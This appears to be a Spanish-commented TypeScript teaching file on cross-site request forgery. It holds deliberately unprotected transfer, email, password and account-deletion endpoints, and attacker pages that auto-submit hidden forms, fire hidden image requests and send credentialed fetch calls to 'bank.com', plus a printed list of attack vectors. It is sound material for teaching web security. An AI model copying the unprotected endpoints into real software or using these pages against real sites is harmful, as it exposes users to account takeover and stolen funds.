/**
 * CSRF Vulnerable (Cross-Site Request Forgery)
 *
 * Conceptos clave:
 * - CSRF explota la confianza que un sitio tiene en el navegador del usuario
 * - El atacante engaña al usuario para que ejecute acciones no deseadas
 * - Se aprovecha de cookies de sesión automáticamente enviadas
 * - No requiere XSS, pero puede combinarse con él
 *
 * Impacto:
 * - Cambios de contraseña no autorizados
 * - Transferencias bancarias
 * - Cambios en configuración de cuenta
 * - Publicación de contenido malicioso
 */

import { createHash, randomBytes } from 'crypto';

// ============================================================================
// Simulación de Base de Datos y Sesiones
// ============================================================================

interface User {
    id: number;
    username: string;
    email: string;
    password: string;
    balance: number;
}

interface Session {
    sessionId: string;
    userId: number;
    createdAt: Date;
}

const users: User[] = [
    {
        id: 1,
        username: 'alice',
        email: 'alice@example.com',
        password: 'hashed_password_1',
        balance: 1000,
    },
    {
        id: 2,
        username: 'bob',
        email: 'bob@example.com',
        password: 'hashed_password_2',
        balance: 500,
    },
];

const sessions: Session[] = [];

// ============================================================================
// ❌ VULNERABLE: Endpoints sin protección CSRF
// ============================================================================

/**
 * VULNERABLE: Transferencia de dinero sin protección CSRF
 *
 * Problema: Solo verifica la sesión, no el origen de la solicitud
 */
export function vulnerableTransferMoney(
    sessionId: string,
    toUsername: string,
    amount: number
): { success: boolean; message: string } {
    // ❌ NO HACER: Solo validar sesión, sin verificar CSRF token

    const session = sessions.find(s => s.sessionId === sessionId);

    if (!session) {
        return { success: false, message: 'Sesión inválida' };
    }

    const fromUser = users.find(u => u.id === session.userId);
    const toUser = users.find(u => u.username === toUsername);

    if (!fromUser || !toUser) {
        return { success: false, message: 'Usuario no encontrado' };
    }

    if (fromUser.balance < amount) {
        return { success: false, message: 'Saldo insuficiente' };
    }

    // Realizar transferencia
    fromUser.balance -= amount;
    toUser.balance += amount;

    return {
        success: true,
        message: `Transferidos $${amount} a ${toUsername}`,
    };
}

/**
 * VULNERABLE: Cambio de email sin protección CSRF
 */
export function vulnerableChangeEmail(
    sessionId: string,
    newEmail: string
): { success: boolean; message: string } {
    const session = sessions.find(s => s.sessionId === sessionId);

    if (!session) {
        return { success: false, message: 'Sesión inválida' };
    }

    const user = users.find(u => u.id === session.userId);

    if (!user) {
        return { success: false, message: 'Usuario no encontrado' };
    }

    // ❌ NO HACER: Cambiar email sin verificar CSRF
    user.email = newEmail;

    return {
        success: true,
        message: `Email cambiado a ${newEmail}`,
    };
}

/**
 * VULNERABLE: Cambio de contraseña sin protección CSRF
 */
export function vulnerableChangePassword(
    sessionId: string,
    newPassword: string
): { success: boolean; message: string } {
    const session = sessions.find(s => s.sessionId === sessionId);

    if (!session) {
        return { success: false, message: 'Sesión inválida' };
    }

    const user = users.find(u => u.id === session.userId);

    if (!user) {
        return { success: false, message: 'Usuario no encontrado' };
    }

    // ❌ NO HACER: Cambiar contraseña sin verificar CSRF
    const hashedPassword = createHash('sha256').update(newPassword).digest('hex');
    user.password = hashedPassword;

    return {
        success: true,
        message: 'Contraseña cambiada exitosamente',
    };
}

/**
 * VULNERABLE: Eliminar cuenta sin protección CSRF
 */
export function vulnerableDeleteAccount(
    sessionId: string
): { success: boolean; message: string } {
    const session = sessions.find(s => s.sessionId === sessionId);

    if (!session) {
        return { success: false, message: 'Sesión inválida' };
    }

    // ❌ NO HACER: Acción destructiva sin CSRF protection
    const userIndex = users.findIndex(u => u.id === session.userId);

    if (userIndex === -1) {
        return { success: false, message: 'Usuario no encontrado' };
    }

    users.splice(userIndex, 1);

    return {
        success: true,
        message: 'Cuenta eliminada',
    };
}

// ============================================================================
// Generador de páginas HTML vulnerables
// ============================================================================

/**
 * VULNERABLE: Formulario de transferencia sin CSRF token
 */
export function vulnerableTransferForm(): string {
    return `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Transferir Dinero</title>
        </head>
        <body>
            <h1>Transferir Dinero</h1>
            <form action="/transfer" method="POST">
                <label>Destinatario:</label>
                <input type="text" name="to" required>
                <br>
                <label>Cantidad:</label>
                <input type="number" name="amount" required>
                <br>
                <button type="submit">Transferir</button>
            </form>
        </body>
        </html>
    `;
}

/**
 * VULNERABLE: Formulario de cambio de email sin protección
 */
export function vulnerableEmailChangeForm(): string {
    return `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Cambiar Email</title>
        </head>
        <body>
            <h1>Cambiar Email</h1>
            <form action="/change-email" method="POST">
                <label>Nuevo Email:</label>
                <input type="email" name="email" required>
                <br>
                <button type="submit">Actualizar</button>
            </form>
        </body>
        </html>
    `;
}

// ============================================================================
// Demostración de Ataques CSRF
// ============================================================================

/**
 * Página maliciosa del atacante - Ataque de transferencia
 */
export function attackerTransferPage(): string {
    return `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Gatos Lindos</title>
        </head>
        <body>
            <h1>¡Mira estos gatos lindos!</h1>

            <!-- Formulario oculto que se auto-envía -->
            <form id="csrf-form" action="https://bank.com/transfer" method="POST" style="display:none">
                <input type="hidden" name="to" value="attacker">
                <input type="hidden" name="amount" value="1000">
            </form>

            <script>
                // Auto-submit del formulario
                document.getElementById('csrf-form').submit();
            </script>

            <img src="cute-cat.jpg">
        </body>
        </html>
    `;
}

/**
 * Ataque CSRF mediante imagen
 */
export function attackerImageCSRF(): string {
    return `
        <!DOCTYPE html>
        <html>
        <body>
            <h1>Artículo Interesante</h1>
            <p>Contenido del artículo...</p>

            <!-- Ataque CSRF mediante GET request (imagen) -->
            <img src="https://bank.com/transfer?to=attacker&amount=1000" style="display:none">

            <!-- Múltiples intentos -->
            <img src="https://bank.com/delete-account" style="display:none">
        </body>
        </html>
    `;
}

/**
 * Ataque CSRF mediante AJAX
 */
export function attackerAjaxCSRF(): string {
    return `
        <!DOCTYPE html>
        <html>
        <body>
            <h1>Página del Atacante</h1>

            <script>
                // Ataque CSRF mediante AJAX (si CORS no está configurado)
                fetch('https://bank.com/change-email', {
                    method: 'POST',
                    credentials: 'include',  // Incluir cookies
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        email: 'attacker@evil.com'
                    })
                }).then(() => {
                    console.log('Email cambiado exitosamente');
                }).catch(err => {
                    console.log('Ataque bloqueado por CORS');
                });
            </script>
        </body>
        </html>
    `;
}

/**
 * Demostración de ataque CSRF
 */
export function demonstrateCSRFAttack(): void {
    console.log('\n=== Demostración de Ataque CSRF ===\n');

    // Simular login de usuario
    const sessionId = randomBytes(16).toString('hex');
    sessions.push({
        sessionId,
        userId: 1,  // Alice
        createdAt: new Date(),
    });

    console.log('1. Usuario autenticado:');
    console.log(`   SessionID: ${sessionId}`);
    console.log(`   Usuario: alice`);
    console.log(`   Saldo inicial: $${users[0].balance}\n`);

    console.log('2. Alice visita sitio malicioso...\n');

    // El sitio malicioso ejecuta la transferencia
    console.log('3. Sitio malicioso envía solicitud de transferencia:');
    console.log('   (Las cookies de sesión se envían automáticamente)');

    const result = vulnerableTransferMoney(sessionId, 'bob', 500);

    console.log(`\n4. Resultado: ${result.message}`);
    console.log(`   Saldo de Alice: $${users[0].balance}`);
    console.log(`   Saldo de Bob: $${users[1].balance}`);

    console.log('\n   ⚠️  ¡Alice perdió $500 sin su consentimiento!');

    // Otro ataque: cambio de email
    console.log('\n5. Segundo ataque: cambio de email');
    const emailResult = vulnerableChangeEmail(sessionId, 'attacker@evil.com');
    console.log(`   ${emailResult.message}`);
    console.log(`   Email de Alice ahora: ${users.find(u => u.id === 1)?.email}`);

    console.log('\n   ⚠️  El atacante ahora controla el email de Alice!');
}

/**
 * Vectores de ataque CSRF
 */
export function printCSRFVectors(): void {
    console.log('\n=== Vectores de Ataque CSRF ===\n');

    console.log('1. FORMULARIOS AUTO-SUBMIT:');
    console.log('   <form action="https://bank.com/transfer" method="POST">');
    console.log('     <input type="hidden" name="to" value="attacker">');
    console.log('   </form>');
    console.log('   <script>document.forms[0].submit();</script>\n');

    console.log('2. IMÁGENES (GET requests):');
    console.log('   <img src="https://bank.com/delete-account">\n');

    console.log('3. IFRAMES:');
    console.log('   <iframe src="https://bank.com/change-email?email=evil@attacker.com">');
    console.log('   </iframe>\n');

    console.log('4. AJAX/FETCH (si CORS mal configurado):');
    console.log('   fetch("https://bank.com/api", {');
    console.log('     credentials: "include"');
    console.log('   })\n');

    console.log('5. LINKS (GET requests):');
    console.log('   <a href="https://bank.com/delete-account">Click aquí</a>\n');
}

/**
 * Condiciones para CSRF exitoso
 */
export function printCSRFConditions(): void {
    console.log('\n=== Condiciones para CSRF Exitoso ===\n');

    console.log('✅ Requisitos:');
    console.log('   1. Usuario autenticado en sitio objetivo');
    console.log('   2. Cookies de sesión automáticamente enviadas');
    console.log('   3. Acción relevante (transferencia, cambio de email, etc.)');
    console.log('   4. Parámetros predecibles (sin CSRF tokens)');
    console.log('   5. Usuario visita sitio malicioso');

    console.log('\n❌ Por qué funciona:');
    console.log('   - Navegadores envían cookies automáticamente');
    console.log('   - Servidor solo verifica cookies de sesión');
    console.log('   - No verifica origen de la solicitud');
    console.log('   - No hay CSRF tokens');
}

/**
 * Comparación vulnerable
 */
export function printVulnerableComparison(): void {
    console.log('\n=== CSRF: ¿Por qué es vulnerable? ===\n');

    console.log('❌ VULNERABLE:');
    console.log('   - Solo autenticación basada en cookies');
    console.log('   - Sin CSRF tokens');
    console.log('   - Sin verificación de Referer/Origin');
    console.log('   - Sin SameSite cookies');
    console.log('   - Acepta GET para acciones que modifican estado');

    console.log('\n⚠️  IMPACTO:');
    console.log('   - Transferencias no autorizadas');
    console.log('   - Cambios de configuración');
    console.log('   - Eliminación de cuenta');
    console.log('   - Publicación de contenido malicioso');
    console.log('   - Escalación de privilegios');

    console.log('\n📝 NOTA:');
    console.log('   CSRF NO requiere XSS, pero se pueden combinar');
    console.log('   para ataques más sofisticados');
}

// ============================================================================
// Ejecución
// ============================================================================

if (require.main === module) {
    console.log('╔════════════════════════════════════════════════════════╗');
    console.log('║          CSRF VULNERABLE - Demostración               ║');
    console.log('╚════════════════════════════════════════════════════════╝');

    demonstrateCSRFAttack();
    printCSRFVectors();
    printCSRFConditions();
    printVulnerableComparison();

    console.log('\n✅ Demostración completada\n');
    console.log('👉 Ver 06-csrf-protection.ts para soluciones seguras\n');
}
